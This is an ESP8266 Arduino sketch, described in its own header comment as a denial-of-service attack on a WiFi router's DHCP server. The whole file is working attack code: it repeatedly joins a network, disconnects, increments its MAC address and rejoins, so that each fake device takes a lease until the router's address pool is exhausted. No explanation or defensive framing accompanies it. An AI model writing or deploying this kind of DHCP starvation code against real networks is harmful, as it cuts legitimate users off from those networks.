/*
 *  This sketch attempts a Denial of Service attach on a DHCP server running
 *  on a WiFi router.
 *
 */

#include <ESP8266WiFi.h>
extern "C" {
#include "user_interface.h"
}
const char* ssid     = "ssid";
const char* password = "password";

byte *mac; // "current" mac/hardware address

void setup() {
  Serial.begin(9600);
  delay(2000);
  // Initialize mac address to actual mac address
  mac = (byte*)malloc(6);
  WiFi.macAddress(mac);
}

void loop() {
  // We start by connecting to a WiFi network

  Serial.println();
  Serial.println();
  Serial.print("Connecting to ");
  Serial.println(ssid);

  WiFi.hostname("");
  WiFi.begin(ssid, password);

  int wait = 0;
  int dots = 0;
  // wait for connection
  while ((WiFi.status() != WL_CONNECTED) && (wait < 240)) {
    delay(500);
    Serial.print(".");
    dots++;
    // terminal is typically 80 characters wide
    if (dots > 79) {
       Serial.println("");
       dots = 0;
    }
    wait++;
  }

  if (WiFi.status() == WL_CONNECTED) {
    Serial.println("");
    Serial.println("WiFi connected");  
    Serial.println("IP address: ");
    Serial.println(WiFi.localIP());
  } else {
    Serial.println("WiFi failed to connected");
  }
  WiFi.disconnect();
  // increment mac address
  char hex = 5;
  while (!(++mac[hex]) && (hex > 0)) {
    hex--;
  }
  // set mac address
  wifi_set_macaddr(STATION_IF, mac);
}

